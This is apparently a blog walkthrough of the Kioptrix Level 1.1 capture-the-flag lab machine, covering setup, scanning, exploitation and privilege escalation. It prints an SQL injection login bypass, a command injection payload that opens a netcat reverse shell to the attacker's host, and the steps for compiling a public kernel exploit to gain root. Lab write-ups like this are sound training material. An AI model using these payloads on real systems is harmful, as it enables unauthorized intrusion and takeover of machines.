---
title: "Kioptrix: Level 1.1 Walkthrough"
date: 2025-01-30T00:00:00+00:00
category: Walkthrough
tags: ["walkthrough", "oscp"]
description: "Step-by-step guide to solving the Kioptrix Level 1.1 machine, covering setup, enumeration, exploitation and privilege escalation. Ideal for beginners."
toc: true
comments: true
---

## **Introduction**
Kioptrix Level 1.1 is a boot2root challenge designed to test penetration testing skills. The goal is to gain root access to the machine using various attack vectors.

---

## **Setup and Configuration**

Before starting the exploitation process, ensure the virtual machine is set up correctly in **VMware Workstation** or **VMware Player**.

### **Steps to Set Up Kioptrix Level 1.1**

1. **Download** the VM image from the official source.
2. Import the VM into VMware Workstation or Player.
3. Allocate a minimum of **512MB RAM** for smooth operation.
4. Configure the **network adapter** to **NAT Mode** for proper connectivity.

---

### **Common VMware Network Issue**

One common issue faced during the setup is the **network adapter reverting to Bridged Mode**, even when explicitly set to NAT Mode. This can disrupt communication between the host and the virtual machine.

#### **Solution**

To resolve this issue:

1. Locate the VMware configuration file for the VM (e.g., `Kioptrix Level 1.1.vmx`).
2. Open the file in a text editor and search for the line:
3. Edit its value to `NAT` as shown below.
   <div style="background-color: #2e2e2e; color: white; border: 1px solid #444; padding: 10px; font-family: 'Courier New', Courier, monospace; white-space: pre-line; word-wrap: break-word; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); line-height: 1.4;">
    memsize = "64"
    ide1:0.present = "FALSE"
    ide1:0.fileName = "F:"
    ide1:0.deviceType = "atapi-cdrom"
    ide1:0.allowGuestConnectionControl = "FALSE"
    ide1:1.present = "FALSE"
    ide1:1.fileName = "Kioptix Level 1.vmdk"
    ide1:1.writeThrough = "TRUE"
    ethernet0.present = "TRUE"
    ethernet0.allowGuestConnectionControl = "FALSE"
    ethernet0.features = "1"
    ethernet0.wakeOnPcktRcv = "FALSE"
    <span style="background-color: #f1c40f; color: black;">ethernet0.networkName = "NAT"</span>
    ethernet0.addressType = "generated"
    guestOS = "other24xlinux"
    uuid.location = "56 4d 0e e7 c2 81 21 e5-2d e6 61 b1 79 11 3d da"
    uuid.bios = "56 4d 0e e7 c2 81 21 e5-2d e6 61 b1 79 11 3d da"
    vc.uuid = "52 77 3c 2e 12 81 3a 68-25 23 b3 92 4e 8e 01 ff"
    </div>
    
4. Now save the configuration file and restart the VM.

---
## **Enumeration**

### **Identifying the Target Machine**

The first step in enumeration is to identify the IP address of the **Kioptrix Level 1** machine in the local network. We can achieve this using the tool **netdiscover**, which is pre-installed in most penetration testing distributions like **Kali Linux**.

#### **Steps to Identify the Target**

1. Open a terminal on your attacker machine.
2. Run the following command to discover all active devices in the network:
   ```bash
   sudo netdiscover -r <NETWORK_RANGE>
   ```

    ```bash
    Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                   
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                            
 _____________________________________________________________________________
    IP               At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.153.1   00:50:56:c0:00:08      1      60  VMware, Inc.                                                                                             
 192.168.153.2   00:50:56:e5:33:16      1      60  VMware, Inc.                                                                                             
 192.168.153.130 00:0c:29:11:3d:da      1      60  VMware, Inc.                                                                                             
 192.168.153.254 00:50:56:ee:1f:12      1      60  VMware, Inc.
 ```
3. The IP of the target host is 192.168.153.130

---

## **Service Enumeration**

Once we have identified the target machine's IP address, the next step is to perform service enumeration to discover running services and their versions.

### **Port Scanning with Nmap**

We will use **Nmap** to identify open ports and running services on the target machine.

1. Run the following command to scan the target for open ports and service versions:

   ```bash
   sudo nmap -p- -sC -sV -O 192.168.153.130 --open
   ```
    ```bash
    ┌──(root㉿KALI)-[/home/hrishi/Desktop]
    └─# sudo nmap -p- -sC -sV -O 192.168.153.130 --open
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-30 18:54 IST
    Nmap scan report for 192.168.153.130
    Host is up (0.00092s latency).
    Not shown: 65528 closed tcp ports (reset)
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
    | ssh-hostkey: 
    |   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
    |   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
    |_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
    |_sshv1: Server supports SSHv1
    80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
    |_http-server-header: Apache/2.0.52 (CentOS)
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    111/tcp  open  rpcbind  2 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2            111/tcp   rpcbind
    |   100000  2            111/udp   rpcbind
    |   100024  1            877/udp   status
    |_  100024  1            880/tcp   status
    443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
    | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
    | Not valid before: 2009-10-08T00:10:47
    |_Not valid after:  2010-10-08T00:10:47
    |_http-server-header: Apache/2.0.52 (CentOS)
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    |_ssl-date: 2025-01-30T09:17:00+00:00; -4h08m23s from scanner time.
    | sslv2: 
    |   SSLv2 supported
    |   ciphers: 
    |     SSL2_DES_64_CBC_WITH_MD5
    |     SSL2_RC2_128_CBC_WITH_MD5
    |     SSL2_RC4_64_WITH_MD5
    |     SSL2_DES_192_EDE3_CBC_WITH_MD5
    |     SSL2_RC4_128_WITH_MD5
    |     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
    |_    SSL2_RC4_128_EXPORT40_WITH_MD5
    631/tcp  open  ipp      CUPS 1.1
    |_http-server-header: CUPS/1.1
    |_http-title: 403 Forbidden
    | http-methods: 
    |_  Potentially risky methods: PUT
    880/tcp  open  status   1 (RPC #100024)
    3306/tcp open  mysql    MySQL (unauthorized)
    MAC Address: 00:0C:29:4F:99:E8 (VMware)
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.9 - 2.6.30
    Network Distance: 1 hop

    Host script results:
    |_clock-skew: -4h08m23s

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 23.87 seconds
    ```
## **Web Enumeration**
### **Nikto scan**
    > Two web services are found in the target machine i.e. port 80 and port 443<br>
    > But nothing is found in the port 443. So continuing to scan the port 80
    ```bash
    ┌──(root㉿KALI)-[/home/hrishi/Desktop]
    └─# nikto -host http://192.168.153.130/    
    - Nikto v2.5.0
    ---------------------------------------------------------------------------
    + Target IP:          192.168.153.130
    + Target Hostname:    192.168.153.130
    + Target Port:        80
    + Start Time:         2025-01-30 20:05:40 (GMT5.5)
    ---------------------------------------------------------------------------
    + Server: Apache/2.0.52 (CentOS)
    + /: Retrieved x-powered-by header: PHP/4.3.9.
    + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
    + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
    + Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
    + OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
    + /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
    + /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
    + /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
    + /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
    + /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
    + /manual/: Uncommon header 'tcn' found, with contents: choice.
    + /manual/: Web server manual found.
    + /icons/: Directory indexing found.
    + /manual/images/: Directory indexing found.
    + /icons/README: Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sun Mar 30 00:11:04 1980. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
    + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
    + /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
    + 8909 requests: 1 error(s) and 17 item(s) reported on remote host
    + End Time:           2025-01-30 20:06:26 (GMT5.5) (46 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested
    ```
    
### **Gobuster scan**
```bash
┌──(root㉿KALI)-[/home/hrishi/Desktop]
└─# gobuster dir -u http://192.168.153.130/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -k -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.153.130/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 319] [--> http://192.168.153.130/manual/]
/usage                (Status: 403) [Size: 288]
Progress: 141708 / 141709 (100.00%)
===============================================================
Finished
===============================================================
```
## **Gaining Access**

> After manually exploring the web application, I found a **login form** on port 80.

![alt text](/assets/img/posts/kioptrix%20level%201.1/login%20page.png)

> I attempted an **SQL Injection** in the username field:

```sql
blah' OR 1 -- -
```

> I left the **password field empty**, and the authentication was successfully bypassed, granting access to the application.

### **Command Injection Exploitation**
 
> After bypassing authentication, I found a form that asked for an IP to ping. Suspecting command injection, I tested it by inserting:<br>
    
    127.0.0.1;id

> This successfully returned the `id` of the target machine, confirming that it was vulnerable to command injection.<br>
> To exploit this vulnerability, I inserted the following payload in the input field:

    127.0.0.1;nc 192.168.153.128 4444 -e sh

> Meanwhile, on the attacking machine, I started listening on port `4444` using the **Penelope** tool from [GitHub](https://github.com/brightio/penelope) with the following command:

    python3 penelope.py -p 4444

> After running this, I successfully obtained a **reverse shell** on the target machine.

## **Privilege Escalation**
> Run the following command to gen the kernel version details
```bash
bash-3.00$ cat /etc/*-release
CentOS release 4.5 (Final)
```
> Searched the kernel version in the searchsploit and found some privilege escalation exploits as shown.

``` bash
┌──(root㉿KALI)-[/home/hrishi]
└─# searchsploit CentOS 4.5        
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Esc | linux/local/9479.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Esca | linux_x86/local/9542.c
Linux Kernel 3.14.5 (CentOS 7 / RHEL) - 'libfutex' Local Privilege Escalation                                              | linux/local/35370.c
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
> Transfer the 9479.c exploit file to the target machine by hosting the file using python server.
> Compile the C file using gcc in the target machine and run the binary as shown.

```bash
bash-3.00$ gcc 9479.c 
9479.c:130:28: warning: no newline at end of file
bash-3.00$ ls
9479.c  a.out
bash-3.00$ ./a.out 
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
```

> Now the target machine has been rooted.


---
<div style="background-color: #f9f9f9; padding: 1rem; border-radius: 8px; text-align: center; font-size: 1.2rem;">
<strong>Thank you for reading, and until next time, keep learning and growing!</strong>
</div>

---